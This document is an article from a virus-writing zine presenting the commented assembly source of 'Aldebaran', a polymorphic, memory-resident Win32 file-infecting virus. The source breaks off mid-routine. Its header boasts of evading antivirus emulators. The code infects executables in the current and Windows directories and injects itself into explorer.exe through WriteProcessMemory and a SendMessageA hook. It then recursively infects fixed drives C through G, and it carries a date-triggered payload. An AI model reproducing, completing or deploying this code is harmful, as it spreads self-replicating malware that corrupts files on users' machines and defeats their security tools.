   ;                                        /-----------------------------\
   ;                                        | Xine - issue #4 - Phile 203 |
   ;                                        \-----------------------------/


   ;
   ;   The Aldebaran virus - written by T00FiC - poly from Bozo
   ;
   ;                                              tanks goes to Ska and Zombie
   ;
   ;
   ; This virus wasn't previewved for xine4, but as old dirty bastard I'm, I
   ; tryed to finish it a bit in hurry. I tested and retested it and it seems to
   ; work. It have a small lack of optimization
   ;
   ; Caracteristic: Win32 Multithread PerProcess/Memory Resident Polymorphic
   ; size-stealth virus (with graphical payload :] )
   ; size about +10 Ko... (I tought to add some mp3 to my virus to beat vecna
   ; viruses size :)
   ;
   ; Multithread: In order to hide activity to the user, the virus recreate
   ; the original task. And when infecting and when the delicate part of writing
   ; datas to the host come. It stop the other thread, so the user is not able
   ; to close the process until the infection was securely done. The virus also
   ; delay a few seconds before infecting file, to make himself hidden and don't
   ; eat all the machines ressources...
   ;
   ; Residency: This is aslo an important point of this virus. On win32 machines,
   ; the virus start, infect 5 file in current directory and 5 file on windows
   ; directory and then stop. But on Windows9x specific machine, the virus is
   ; able to use specific apis used for patching/debugging other process. So
   ; the virus look for explorer.exe loaded in memory. Map the file, detect api
   ; export list and a viable location to put a mini stub loader. So, when
   ; explorer run the SendMessageA api (it does it all the time EXCEPT under dos
   ; boxes), the stub allocate memory and create a thread. This thread is owned
   ; by Explorer.exe. The virus then read memory location and drop over the
   ; explorer memory the virus body. Then the created stub run and init the
   ; memory resident routine. It bascially scan recursively each directory
   ; on fixed disk from C to G (It tryed also to infect my network harddrive :)
   ;
   ; Polymorphism: Polymorphism was done by Bozo, it was the main idea and
   ; original idea of this virus: Create a small (he was small) virus to use
   ; the bozo poly engine. Now the Polymorphism is used as end user encryption.
   ; It's I think the strongest and much hard to detect encryption loop this
   ; virus have. The poly random is based on the original host compression rate
   ; (I will explain later)
   ;
   ; Size stealth: This virus don't use as some poeple call it the 29A
   ; technique (I find saying that's my technique is dork, so I could say ace
   ; archive infection is the IKX technique, that way of finding kernel is IKX
   ; technique blablabla). The virus look if entrypoint point to code (to avoid
   ; binray compressed) then he run over there. Look if there's enough
   ; place in the section, if the distance from the section and the entrypoint
   ; is big enough and then calculate where/how much/what it will have to
   ; compress. Compression use a basic huffman compression done in about 600
   ; byte. So it have to decompress at running, and this take a lot of time and
   ; code are saying saying ? Noooo, it just take 100 byte and 84 milisecond on
   ; my old ready-to-infect P133 computer to decompress. The virus have to
   ; allocate memory, so to this 100 is added 300 or 400 byte for seh handling,
   ; kernel locator, apis finding, priority process manager.

   ; Note: The virus is encrypted in 8 bit without saving the key but it will
   ; have to test each keys, to annoy emulator, the virus allocate huge memory
   ; to drop decompressed datas and run over there his decryption routine. So I
   ; wonder how they will take this virus... Okay, 8 bit suck, avers have just
   ; to test every 8 bit possibility, no that's wrong, they have to test ALL
   ; the algortihm because the key is sliding and changing each loop, (I put
   ; the needed datas to be decrypted on the end of decryption buffer) so they
   ; have to decrypt/reencrypt each time the data. making about 10000 loops on
   ; each keys, good luck guys....
   ;
   ; Second note: look how is stored original enrtypoint: 1st, it's encrypted
   ; without saving the key, secondly, it's compressed with virus in the original
   ; ready to be compressed buffer. Third, it's encrypted using the complex
   ; polymorphic engine of Bozo.I like to read that 3 sentences again and again...
   ;
   ; Payload: I wish you will appreciate it
   ;
   ; There's also some thing to say on this virus. It's a bit based on axelle and
   ; voodoo technologies for base. The main infection concept is based on
   ; old ariannes viruses family using old fashioned write and close apis...
   ;
   ; There's so much to say over this virus, stop blabla, and look code...
   ;

   .386
   .model flat,stdcall

   extrn   ExitProcess:Proc
   extrn   Sleep:Proc

   .data

   dw      ?

   .code

   Host:   xor     ebp,ebp
           jmp     Init0               ; fake virus initialization

   pseudohost:

       push    10000               ; you should put it
       call    Sleep               ; let virus time to infect

       call    ExitProcess         ; boooooooooooom -(

   start:
           call    getdelta
   getdelta:   pop ebp
           sub ebp,offset getdelta ; now we have delta

           push    ecx

   RDAE:       xor edx,edx

   RDAE1:
                   mov     ecx,pseudofin-StartCrypt
                   lea     esi,[ebp+StartCrypt]        ; pseudo decryptor
           push    edx
   RDAE2:

           sub byte ptr [esi],dl
           sub dl,99
           xor byte ptr [esi],dl
           xor dl,25

           inc esi

           loop    RDAE2               ; loop my son, loop...

           dec esi

           cmp dword ptr [esi-3],'nara'        ; check for
           jne RDAE4                   ; Aldebaran

                   cmp     dword ptr [ebp+StartCrypt],'xkI0'       ; check for
                   je      RDAE5                                   ; 1st dword
   RDAE4:
                   mov     ecx,pseudofin-StartCrypt
   RDAE3:
           xor dl,25                   ; reencrypt it
           xor byte ptr [esi],dl           ; if it was
           add dl,99                   ; wrong
           add byte ptr [esi],dl

           dec esi
           loop    RDAE3

           pop edx
           inc edx

           jmp RDAE1
   StartCrypt:

           db  '0Ikx'

   Restore:    dd  0
   Return:     dd  offset pseudohost
   backdata:   dd  0

   RDAE5:

   Init:
           pop edx             ; we got it
           pop ecx             ; now restore host

           lea     esi,[ebp+pseudofin]
           mov     edi,dword ptr [ebp+Restore]

           repz    movsb               ; blablabla
   Init0:
           mov dword ptr [ebp+LoadLibraryA],0

           lea edx,[ebp+returnapis]        ; init apis

           mov ecx,255
           mov edi,edx
           xor eax,eax
           repz    stosb               ; clear the api return
                               ; zone, we want fresh
           lea eax,[ebp+getapis]       ; datas
           call    initapi

           mov eax,dword ptr [ebp+Return]
           mov dword ptr [ebp+ReturnTemp],eax      ;

           mov dword ptr [ebp+LoadLibraryA],0      ; force Load
                           ; library again later...
           mov eax,85000
           call    alloc               ; for compression

           mov dword ptr [ebp+databuffer],eax

           mov eax,85000
           call    alloc               ; double buffer, I
                               ; like them :P
           mov dword ptr [ebp+compressbuffer],eax

           lea eax,dword ptr [ebp+File_Data]
           push    eax
           call    dword ptr [ebp+GetSystemTime]   ; check for payload
                               ; activation ...
           cmp word ptr [ebp+File_Data+2],8
           jne nopayload

           cmp word ptr [ebp+File_Data+6],5    ; each 5 august
           jne nopayload

           call    payload

   nopayload:

           push    eax

                   push    esp
                   push    0
                   push    0
                   push    dword ptr [ebp+ReturnTemp]
                   push    0
                   push    0
                   call    dword ptr [ebp+CreateThread]    ; create the other
                               ; original thread
           mov dword ptr [ebp+ForeignThread],eax

           pop eax

                   call    Residency1          ; install memory
                               ; 1st time

           mov byte ptr [ebp+checkflag],0

                   push    edx
                   push    esp
                   push    0
                   push    0
                   lea     edx,[ebp+Goresidency2]
                   push    edx
                   push    0
                   push    0
                   call    dword ptr [ebp+CreateThread]    ; create forcing 2nd
                               ; time
                   pop     eax

                   cmp     byte ptr [ebp+reserror],5   ; go to end
                   je      skipinfect

   mainbody:

   mov byte ptr [ebp+treeflag],1
   mov byte ptr [ebp+stopflag],1

   mov byte ptr [ebp+maxinfect],6
   mov byte ptr [ebp+countinfect],0
   mov word ptr [ebp+waitscan],250         ; init infection
                               ; procedure type
                               ; a bit slow to don't
                               ; perturb the process
   Infectdirs:

   ;
   ; This routine is the unique residency on winNT
   ;

   mov byte ptr [ebp+treeflag],1

   lea eax,[ebp+originaldir]
   push    eax
   push    512
   call    dword ptr [ebp+GetCurrentDirectoryA]        ; kill the directory

   call    Killdir

   lea eax,[ebp+originaldir]               ; this is dangerous
   push    eax                     ; I wont like running
   push    512                     ; this routine
   call    dword ptr [ebp+GetWindowsDirectoryA]        ; kill windows directory

   call    Killdir

   fini:

   skipinfect:

                   mov     eax,dword ptr [ebp+databuffer]
                   call    Delloc

                   mov     eax,dword ptr [ebp+compressbuffer]
                   call    Delloc

           cmp byte ptr [ebp+checkflag],1

                   push    0

                   push    4000h                           ; mem decommit
                   push    0                               ; size
                   lea     eax,[ebp+start]
                   push    eax

                   push    dword ptr [ebp+ExitThread]  ; the death row....
                   jmp     dword ptr [ebp+VirtualFree]     ; in fact,
                                                       ; it's virtual free
   Goresidency2:

   call    getdel

   push    2000
   call    dword ptr [ebp+Sleep0]          ; wait 2 sec

   call   Residency2                               ; then install memory


   mov byte ptr [ebp+checkflag],1

   push    0
   call    dword ptr [ebp+ExitThread]      ; boom biddy byebye

   residencystart:

           call    getdel          ; this is main thread code
                           ; when we are TSR
           lea edx,[ebp+returnapis]

           mov ecx,255
           mov edi,edx
           xor eax,eax
           repz    stosb           ; this is done

           lea eax,[ebp+getapis]
           call    initapi         ; we got it

           mov byte ptr [ebp+maxinfect],1
           mov byte ptr [ebp+countinfect],0
           mov word ptr [ebp+waitscan],25  ; set maximum free

           mov byte ptr [ebp+stopflag],0
           mov byte ptr [ebp+treeflag],0

           mov eax,85000           ; eh, realloc for vir.
           call    alloc

           mov dword ptr [ebp+databuffer],eax

           mov eax,85000
           call    alloc               ; realloc

           mov dword ptr [ebp+compressbuffer],eax

           mov byte ptr [ebp+treeflag],0

           mov dword ptr [ebp+originaldir],'\:C'   ;infect all C:

   killthatdir:

           call    Killdir                 ; hohoho

   includeme:

           inc byte ptr [ebp+originaldir]
           mov byte ptr [ebp+originaldir+3],0

           cmp byte ptr [ebp+originaldir],'G'
           ja  finishthread                ; infect until
                                   ; G:
           lea eax,dword ptr [ebp+originaldir]
           push    eax
           call    dword ptr [ebp+GetDriveTypeA]       ; Get the
                                   ; drive type
           cmp eax,3
           jne includeme               ; don't touch
                                   ; cdroms or such
           jmp killthatdir

   finishthread:   jmp finishthread            ; endless jump

   startapis:

   StubLoader:
           call    getdel2
   getdel2:    pop ebp
           cld
           sub ebp,offset getdel2

                   lea     eax,[ebp+getapis1]
                   lea     edx,[ebp+returnapi1]            ; mini stub
                                   ; loader
           call    initapi                 ; init apis

           call    dword ptr [ebp+GetCurrentProcess0]

           push    eax

           push    100h
           push    eax

           push    eax
           call    dword ptr [ebp+GetPriorityClass0]
           mov dword ptr [ebp+originalpriority],eax

           call    dword ptr [ebp+SetPriorityClass0]   ; set priority

           mov eax,dword ptr [ebp+finloader+1]
                   push    eax                 ; get memory
                                   ; from small
                   push    40h                 ; compressed
                   push    00100000h or 1000h or 2000h     ; header...
                   add     eax,0111b
                   and     eax,-111b
                   push    eax
                   push    0
                   call    dword ptr [ebp+GlobalAlloc0]        ; allocate
                                   ; memory
           mov edi,eax

           lea esi,[ebp+finloader]         ; okay, do it
                   push    edi
           push    ebp

   UnDkCMP:

   cmp     byte ptr [esi],'h'                              ; check if okay
   jne thenbad

   push    dword ptr [esi+1]

   movzx   ecx,word ptr [esi+5]                            ;
   xor     edx,edx                                         ; donc annoy edx
   mov     eax,4                                           ; so eax = ecx * 4
   mul     ecx                                             ; we need to keep
                                                           ; ecx
   lea     ebp,[esi+7]                                     ; setting correspond.
   lea     esi,[esi+eax+9]                                 ; setting where data
                                                           ; begin
   detectall:

   pop ecx
   xor     edx,edx             ; edx = current byte value

   starloop:

   xor ebx,ebx
   xor     dh,dh                                          ; start, nullify these

   highloop:

   push    ecx
   push    ebp

   highloop2:

   mov     ecx,7                                           ; number of time
                                                           ; looping
   wefoundit:

   cmp dl,8
   jb      dontresetcounter                                ; end of ascii
                                                           ;
   inc     esi                                             ; get next
   xor dl,dl

   dontresetcounter:

   sub     cl,dl                                           ; then we get

   lodsb
   dec     esi                                             ; here the actual

   ror     al,cl                                           ; value of the bits
   and     al,1                                            ; and concatenate it
   rol     bx,1                                            ; with a bit buffer
   xor     ah,ah                                           ; placed in a regist.
   add bx,ax
   inc edx
   inc dh

   xor     ecx,ecx                                         ; reset ecx

   thengetnext:

   cmp dh,byte ptr [ebp+1]
   jb  highloop2                   ; don't check all the
                               ; three
   cmp     dh,byte ptr [ebp+1]                             ; is this size equal?
   jne w0comehere

   cmp     bx,word ptr [ebp+2]                             ; is this byte equal?
   je  wefoundit0

   w0comehere:

   add     ebp,4                                           ; if not scan next
   inc ecx

   cmp     word ptr [ebp],-1                               ; if end of corresp.
   jne     thengetnext                                     ; then it's not

   returnme:

   pop     ebp                                             ; reset ebp to
   push    ebp                                             ; start of correspond.

   jmp     highloop2                                       ; complete ascii...

   wefoundit0:

   mov     al,byte ptr [ebp]                               ; else we got it!
                                                           ; and then change it
                                                           ; to ascii
   pop     ebp                                             ; restore data for
   pop     ecx                                             ; next loop

   stosb                                                   ; push byte
   loop    starloop                                ; decompression finished !

   thenbad:

   pop ebp

   pop     eax
   pop ecx

   sub     ecx,pseudofin-start         ; setting value for

   pop edx                 ; returning

   push    eax
   push    ecx

   push    dword ptr [ebp+originalpriority]
   push    edx
   call    dword ptr [ebp+SetPriorityClass0]   ; refix priorities

   pop ecx
   pop eax
   jmp eax                 ; run virus now

   ;
   ; This is a multiDLL reactor, it comes from the version 2 of the reactor in
   ; arianne, hope you enjoy the code! This is version 3b coz it's specialy
   ; designed for DrGreenThumb 2.
   ;
   ; Version 3b: Thatsokaynow
   ; Version 3: Multiple DLL scanning
   ;        PseudoImportZone(tm) created
   ;            Minor changes, large instructions revised and redefined structure
   ; Version 2: Uses ZeroCRCs
   ;        Only one loop used
   ;        NT/95/98 compatible
   ;        some bugs fixed, structure change, one loop, time gain
   ; Version 1: First prototype - Pretty small
   ;

   initapi:

       mov esi,eax                 ; point to the mini
       push    esi                 ; import

   dothescanner:

       inc esi
       cmp byte ptr [esi],-1           ; check if we reached
       jne     dothescanner                ; end of mini import

       inc esi
       sub edx,esi
       mov dword ptr [ebp+Thisoffset],edx      ; so this is for fixing
       sub esi,4                   ; a problem of using
       mov dword ptr [ebp+Thisoffset2],esi     ; too much register
       pop esi                 ; for finding apis
                               ; I should optimizate
   dothatnow:                      ;   ... a day...

       cmp     byte ptr [esi],0FFh         ; we reached end ok...
       jne letscontinue
       ret

   letscontinue:
       mov     ebx,esi

   scannext:

       inc esi
       cmp     byte ptr [esi-1],'.'            ; look for . separating
       jne scannext                ; library names

       push    esi

       push    dword ptr [esi]             ; avoid
       push    esi                 ; overwriting
       mov dword ptr [esi],'lld'           ; so set dll name
       push    ebx

       cmp byte ptr [ebp+stubtest],1       ; this is for avoiding
       je  gotherenow              ; 1st loop

       cmp byte ptr [ebp+LoadLibraryA],0       ; so we get this api
       jne dontinitit

   gotherenow:

   GetHardKernel:

   pushad
   mov dword ptr [ebp+stackrejust],esp     ; we have to save stack
   call    SaveSEH                 ; coz seh crash it

   lea     eax,[ebp+kntestnext1]           ; we fix seh to next
   call    SetSEH                  ; scan procedure

   cmp word ptr cs:[07fe00000h],'ZM'       ; check for win2K kernel but
   jne     kntestnext1             ; does it will works anyway ???

   mov     eax,07fe00000h
   jmp wefound1                ; that's okay

   stackrejust:    dd  0

   kntestnext1:

   lea     eax,[ebp+kntestnext2]           ; set stack to next kernel
   call    SetSEH

   cmp word ptr cs:[07ff00000h],'ZM'       ; this should be Nt Kernel
   jne     kntestnext2

   mov eax,07ff00000h
   jmp wefound1

   kntestnext2:

   lea     eax,[ebp+kntestnext4]           ; set SEH to crash procedure
   call    SetSEH                  ; okay, it's lame coding...

   cmp word ptr cs:[0BFF70000h],'ZM'       ; check Win9x kernel
   jne kntestnext4             ; this

   mov     eax,0bff70000h
   jmp wefound1

   kntestnext4:

   call    RestoreSEH

   mov     word ptr cs:[0BFF70000h],500        ; this program made an
                           ; exception blablabla
   wefound1:

   call    RestoreSEH              ; now we restore the old  SEH
   mov esp,dword ptr [ebp+stackrejust]     ; reajust stack
   mov dword ptr [esp+20h-4],eax       ; save eax
   popad                       ; and reset stack
   pop ebx                 ; we got in eax the kernel
   jmp wefound                 ; location

   dontinitit:

       call    dword ptr [ebp+LoadLibraryA]        ; get apis adress

   wefound:

       cmp eax,-1                  ; error, erm bye...
       jne itsokay1

       pop esi
       ret

   itsokay1:

       mov edi,eax
       pop esi
       pop dword ptr [esi]

           mov     ebx,dword ptr [edi+3Ch]
           add     ebx,edi                         ; ebx point to the PE header
                                                   ; In fact it's allways PE
                           ; I skiped the MZ and PE
                           ; signature check coz if it's
                           ; not, Kernel can't be loaded :]
           mov     esi,dword ptr [ebx+120]         ; esi point to the Export
           lea     esi,[esi+edi]                   ; zone

           mov     ecx,dword ptr [esi+24]          ; ecx = number of export
           mov     ebx,dword ptr [esi+32]          ; ebx point to the name offset
           add     ebx,edi                         ; table
       push    ebp
   ;   mov ebp,offset startapis
       db  0bdh
   Thisoffset2:
       dd  0h

   Scanstring:


           mov     edx,dword ptr [ebx]             ; edi point to the 1st
           add     edx,edi                         ; name

   loophere:

       pushad
       mov eax,dword ptr [esi+24]
       sub eax,ecx
       shl eax,2               ; we have to search apis
       lea edx,[ebx+eax]           ; by ordinal/names
       mov edx,[edx]           ; coz NT have some disachronism
       add edx,edi             ; name in table is not the
                           ; same that follow each other
       push    ecx
           xor     eax,eax
           xor     ecx,ecx

           mov     al,byte ptr [edx]

   getnamecrc:

           mov     cl,byte ptr [edx]       ; this is really small crc
           test    ecx,ecx             ; untill now, I never had
           jz      test_crcs           ; confusion between them
           rol     eax,3               ; a just small nice algorithm
           xor     eax,ecx
           inc     edx
           jmp     getnamecrc          ; enjoy guys...

   test_crcs:

       pop ecx
       inc edx

   testnext:

       add ebp,4
       cmp byte ptr [ebp],-1       ; we reached end of list ?
       je  suither             ; boom biddy byebye

           cmp     dword ptr [ebp],eax
       jne testnext            ; if crc in list = calculated
                           ; no, then byebye
   getrva:

           mov     ebx,dword ptr [esi+24]      ; we get apis number
       sub ebx,ecx             ; sub number of loop we done
       shl ebx,1               ; got in ebx the apis ordin.

           add     ebx,dword ptr [esi+36]          ; table RVA
           add     ebx,edi                         ; Add Rva
       xor eax,eax             ; seems to be okie!
       mov ax,word ptr [ebx]       ;

       shl eax,2               ; damn, I forgot the meaning
                           ; of all that
       add eax,dword ptr [esi+28]      ; shame on me...
       add eax,edi

       mov     eax,dword ptr [eax]
       add eax,edi
       dec     ebx             ; we saved it now

   ;   add ebp,offset startlist-startapis
   db  081h
   db  0c5h
   Thisoffset:
       dd  0h

       mov dword ptr [ebp],eax

   suither:

       popad
       loop    loophere        ; loop until all apis are scanned
       pop ebp
       pop esi

       jmp dothatnow       ; return

   SaveSEH:

   push    eax
   mov     eax,dword ptr fs:[0]
   mov     dword ptr [ebp+backup],eax          ; save last SEH
   pop     eax
   ret

   RestoreSEH:

   push    eax
   mov     eax,dword ptr [ebp+backup]
   mov     dword ptr fs:[0],eax                ; restore last SEH
   pop     eax
   ret

   SetSEH:

   push    eax

   mov     dword ptr [ebp+TemporarySEH+8],eax
   lea eax,[ebp+BackNow]
   mov dword ptr [ebp+TemporarySEH+4],eax
   lea     eax,[ebp+TemporarySEH]
   mov     dword ptr fs:[0],eax                ; now we set the SEH

   pop     eax

   ret

   BackNow:                    ; here we get

   call    getpseudodelta
   getpseudodelta:
   pop ebp
   sub ebp,offset getpseudodelta       ; take again the delta,
                           ; grrr, f- ms programmers
   push    dword ptr [ebp+TemporarySEH+8]      ; and then back now!
   ret

   backup: dd  0

   TemporarySEH:                   ; our SEH...

   dd      0
   dd      0
   dd  0

   originalpriority:   dd  0

   getapis1:

   db 'KERNEL32.'
   db -1
   dd 0ab16d5ceh
   dd 0cb8d7a80h
   dd 046863856h
   dd 04690b856h
   db -1

   stubtest:       db  0

   returnapi1:

   GlobalAlloc0:           dd      0
   GetCurrentProcess0: dd  0
   GetPriorityClass0:  dd  0
   SetPriorityClass0:  dd  0

   FinStub:

   finloader:

   ;
   ; File Action API interface     Note, I could remplace that by big flat
   ;                               true win32 file apis but I don't want to...
   ;

   Open_file:

   push 2                       ; iReadWrite = OF_READWRITE

   lea eax,[ebp+workingdir]               ; point to the name datas
   push eax

   Call dword ptr [ebp+Lopen]                ; open the file

   mov dword ptr [ebp+FileHandle],eax
   inc eax
   ret

   Close_file:

   push dword ptr [ebp+FileHandle]     ; close the file
   call dword ptr [ebp+Lclose]
   ret

   Write_file:
   push ecx
   push edx

   push dword ptr [ebp+FileHandle]         ; Write in the file
   call dword ptr [ebp+Lwrite]
   ret

   Read_file:
   push ecx
   push edx

   push dword ptr [ebp+FileHandle]     ; Read in the file
   call dword ptr [ebp+Lread]
   ret

   Seek_file:

   push 0
   push edx
   push dword ptr [ebp+FileHandle]     ; Seek in the file
   call dword ptr [ebp+Llseek]

   ret

   alloc:
   MemAlloc:                       ; Reviewved for nties compatib.

   push    40h
   push    00100000h or 1000h or 2000h
   add eax,0111b
   and eax,-111b
   push    eax
   push    0
   call    dword ptr [ebp+VirtualAlloc]            ; just allocating...

   cmp eax,0
   jne Allocitsokay

   inc eax
   inc eax
   add eax,-1

   Allocitsokay:
   ret

   Delloc:

   push    4000h                       ; mem decommit
   push    0                                               ; size
   push    eax

   call    dword ptr [ebp+VirtualFree]
   ret

   InitCritical:

   pushad

   cmp     byte ptr [ebp+stopflag],1
   je      skipinf

   push    dword ptr [ebp+ForeignThread]
   call    dword ptr [ebp+SuspendThread]           ; okay stop task
                               ; bastard....
   skipinf:

   popad

   ret

   LeaveCritical:

   pushad

   cmp     byte ptr [ebp+stopflag],1       ; depend on resident or not
   je      skipinf


   push    dword ptr [ebp+ForeignThread]
   call    dword ptr [ebp+ResumeThread]        ; and then recreate it


   popad

   ret

   stopflag:       db      0

   Residency1:

   pushad

   mov byte ptr [ebp+reserror],0           ; byebye

   mov eax,dword ptr [ebp+VirtualAlloc]
   mov dword ptr [ebp+VirtualAllocT],eax       ; preset these apis

   mov eax,dword ptr [ebp+CreateThread]
   mov dword ptr [ebp+CreateThreadT],eax       ; for remote residency

   cmp dword ptr [ebp+CreateToolhelp32Snapshot],0  ; set NT compatibilty
   je  fini001

   push    0
   push    0Fh
   call    dword ptr [ebp+CreateToolhelp32Snapshot]    ;exist only under win9x

   push    eax

   lea edx,dword ptr [ebp+datadummy]           ; how much datas in

   mov dword ptr [edx],1024                ; buffer

   push    edx
   push    eax
   call    dword ptr [ebp+Process32First]          ; get 1st process in
                               ; mem infos
   testnext5:

   lea edi,[ebp+datadummy+24h]

   mov ecx,255

   push    ecx

   ;
   ; This could be applied to everything, and you could patch every programs
   ;

   checkthat:  cmp     dword ptr [ecx+edi],'LPXE'  ; check explorer.exe ?
           je  wefoundit5
           loop    checkthat

               pop ecx
           push    ecx

   checkthat2:     cmp     dword ptr [ecx+edi],'lpxe'  ; explorer
           je  wefoundit5
           loop    checkthat2

           pop ecx
   backhere:

   pop eax
   push    eax

   lea edx,dword ptr [ebp+datadummy]

   ;mov    dword ptr [edx],1024            ; ms programmers are clown...
   push    edx
   push    eax
   call    dword ptr [ebp+Process32Next]       ; get next process in mem

   cmp     eax,0
   jne testnext5               ; no explorer in memory ???
                           ; hahahaha
   fini0:

   pop eax

   fini001:

   movzx   eax,byte ptr [ebp+reserror]     ; come back!
   mov     dword ptr [esp+20h-4],eax

   popad
   ret                     ; Exit code 0

   wefoundit5:

   pop eax

   mov eax,dword ptr [ebp+datadummy+8]
   push    eax                 ; what we want
   push    0
   push    01f0fffh                ; all right value, Tanx to peon
   call    dword ptr [ebp+OpenProcess]

   mov dword ptr [ebp+processid],eax       ; we got the process handle

   push    0
   push    edi

   call    dword ptr [ebp+Lopen]           ; going to open the explorer

   mov dword ptr [ebp+FileHandle],eax      ; and going to map it

   push    eax

   push    0
   push    eax
   call    dword ptr [ebp+GetFileSize]

   pop edx

   push    eax

   push    0
   push    eax
   push    0
   push    02h
   push    0
   push    edx

   call    dword ptr [ebp+CreateFileMappingA]  ; this long procedure is boring

   mov dword ptr [ebp+MapHandle],eax

   push    0
   push    0
   push    4h
   push    eax
   call    dword ptr [ebp+MapViewOfFile]

   mov dword ptr [ebp+MapHandle1],eax      ; okay now it's ampped

   mov esi,eax

   mov edi,dword ptr [esi+03ch]        ; get PE blablabla
   add edi,esi

   mov     eax,dword ptr [edi+0F8h+40+8]
   add     eax,dword ptr [edi+0F8h+40+12]      ; get look if there's dead rooms
                           ; in PE memory
   cmp     eax,dword ptr [edi+0f8h+40+40+12]   ; there should be , memory
   jae     skiploading             ; is rounded by minimum 4K of
                           ; mem on intel compus
   add     eax,dword ptr [edi+52]
   mov dword ptr [ebp+Ourmemory],eax       ; we got memomry

   mov eax,dword ptr [edi+128]
   call    RVA2Offset              ; now we scan the import

   lea edx,[eax-20]

   scannexta:

   add edx,20
   mov eax,dword ptr [edx+12]

   cmp eax,0
   je  skiploading

   call    RVA2Offset                  ; we get adress name

   cmp dword ptr [eax],'RESU'              ; check user32.dll
   je  wegotitit

   cmp dword ptr [eax],'resu'
   jne scannexta

   wegotitit:

   mov eax,dword ptr [edx]             ; and then we look
   call    RVA2Offset                  ; for api import list

   mov ebx,eax
   xor ecx,ecx
   sub ecx,4                       ; and make a loop to do

   boucleme:

   add ecx,4
   mov eax,dword ptr [ebx+ecx]

   cmp eax,0
   je  skiploading

   call    RVA2Offset

   cmp dword ptr [eax+2],'dneS'            ;
   jne boucleme

   cmp dword ptr [eax+2+4],'sseM'
   jne boucleme

   cmp dword ptr [eax+2+8],'Aega'      ; looking For SendMessageA
   jne boucleme

   mov     dword ptr [ebp+checktest],0         ; intenal flag

   add ecx,dword ptr [edx+16]              ; we got the rva of
                               ; the api!!!
   add ecx,dword ptr [edi+52]

   mov     dword ptr [ebp+PseudoData+12],ecx   ; okay, then we save it

   lea edx,dword ptr [ebp+PseudoData]
   push    edx                 ; NumbWrite
   push    4
   lea edx,dword ptr [ebp+Pseudoreturn]
   push    edx                 ; Buffer
   push    ecx                 ; process base
   mov eax,dword ptr [ebp+processid]
   push    eax                 ; processID
   call    dword ptr [ebp+ReadProcessMemory]   ; check for residency

   inc byte ptr [ebp+reserror]

   cmp dword ptr [ebp+Pseudoreturn],80000000h
   jb      skiploading2                ; we are resident!

   lea edx,dword ptr [ebp+PseudoData]
   push    edx                 ; NumbWrite
   push    finannoy-AnnoyingCode
   lea edx,dword ptr [ebp+AnnoyingCode]
   push    edx                 ; Buffer
   push    dword ptr [ebp+Ourmemory]       ; process base
   mov eax,dword ptr [ebp+processid]
   push    eax                 ; processID
   call    dword ptr [ebp+WriteProcessMemory]  ; save our gotta resident code

   lea edx,dword ptr [ebp+PseudoData]
   push    edx                 ; NumbWrite
   push    4
   lea edx,dword ptr [ebp+Ourmemory]
   push    edx                 ; Buffer
   push    dword ptr [ebp+PseudoData+12]       ; process base

   mov eax,dword ptr [ebp+processid]
   push    eax                 ; processID
   call    dword ptr [ebp+WriteProcessMemory]  ; WE ARE GOING TSR -)

   ;
   ; running the remote thread ,but how
   ;

   skiploading:

           call    Close_file          ; that's lame, I didn't unmaped
       jmp fini0               ; the file, but who care ?

   skiploading2:

       call    Residency2          ; we where loaded in explorer
       jmp skiploading         ; mem, so do it

   AnnoyingCode:

   fakejump:

       db  68h
   Pseudoreturn:

       dd  0h          ; push apis offset

   retback:

       nop

       pushad

           call    getdel              ; get delta pointer

       mov byte ptr [ebp+retback],0C3h ; lock api access

       push    40h
       push    00100000h or 1000h or 2000h
       push    (((fin-start)+0111b) and 11111111111111111111111111111000b)
       push    0
           call    dword ptr [ebp+VirtualAllocT]   ; allocate memory

       mov dword ptr [ebp+checktest],eax
       mov dword ptr [ebp+checktest2],eax
       mov byte ptr [eax],0C3h

       push    eax
       push    esp
       push    0
       push    0
           lea     eax,[ebp+Loadingresult]
       push    eax
       push    0
       push    0
       call    dword ptr [ebp+CreateThreadT]   ; creating our task
       pop eax

       popad

       ret

   getdel:
       call    GetMeThere

   GetMeThere:
       pop ebp
       sub ebp,offset GetMeThere
           ret

   Loadingresult:  call    getdel      ; this task wait for memory transerf
                       ; work like a benny's fiber but wait
                   mov     eax,dword ptr [ebp+checktest2]      ; for both
                                   ; part to start
   testme:         cmp     dword ptr [ebp+checktest],'yakO'    ; Okay
                   jne     testme

                   add     eax,residencystart-start
                   jmp     eax             ; here we go

   checktest:  dd  0               ; memory allocated ?
   checktest2: dd  0               ; virus transfered ?
                               ; -> Thread begin
   CreateThreadT:  dd 0                    ; yeeeeeeeeepeee
   VirtualAllocT:  dd 0

   finannoy:


   RVA2Offset:                     ; this routine
                               ; is supposed to
   pushad                          ; transfer RVA to
                               ; an offset in memory
   lea edx,[edi+0F8h]                  ; map, usefull to play
   sub edx,40                      ; with loaded process
                               ; with only disk
   scannext99:                     ; image

   add edx,40                      ; it's a bit based on
   mov ebx,dword ptr [edx+12]              ; axelle virus
   mov ecx,ebx
   add ecx,dword  ptr [edx+16]

   cmp ebx,0
   je  fino

   cmp eax,ebx
   jb  scannext99

   cmp eax,ecx
   ja  scannext99

   sub eax,ebx
   add eax,dword ptr  [edx+20]
   add eax,esi

   mov dword ptr [esp+20h-4],eax
   popad
   ret

   fino:

   mov dword ptr [esp+20h-4],0
   popad
   ret

   Residency2:                 ; I'm sad like hell today
                           ; I feel bad like I never felt
   pushad                      ; bad....

   cmp     byte ptr [ebp+reserror],0
   je      finishcheckres

   cmp     byte ptr [ebp+reserror],5
   je      finishcheckres

   call    InitCritical                            ; we don't want
                                                   ; to be perturbed
                                                   ; during the operation
   lea     edx,dword ptr [ebp+PseudoData]
   push    edx                                     ; NumbWrite
   push    4
   lea     edx,dword ptr [ebp+Pseudoreturn]
   push    edx                                     ; Buffer

   mov     ecx,dword ptr [ebp+Ourmemory]
   add     ecx,checktest-AnnoyingCode

   push    ecx                                     ; process base

   mov     eax,dword ptr [ebp+processid]
   push    eax                                     ; processID
   call    dword ptr [ebp+ReadProcessMemory]

   cmp     dword ptr [ebp+Pseudoreturn],0
   je      finishcheckresb

   cmp dword ptr [ebp+Pseudoreturn],'yakO'
   je  finishcheckresb

   lea     edx,dword ptr [ebp+PseudoData]
   push    edx                                     ; NumbWrite
   push    pseudofin-start
   lea     edx,dword ptr [ebp+start]
   push    edx                                     ; Buffer
   push    dword ptr [ebp+Pseudoreturn]
   mov     eax,dword ptr [ebp+processid]
   push    eax                                     ; processID
   call    dword ptr [ebp+WriteProcessMemory]

   lea     edx,dword ptr [ebp+PseudoData]
   push    edx                                     ; NumbWrite
   push    4
   lea     edx,dword ptr [ebp+moins1]
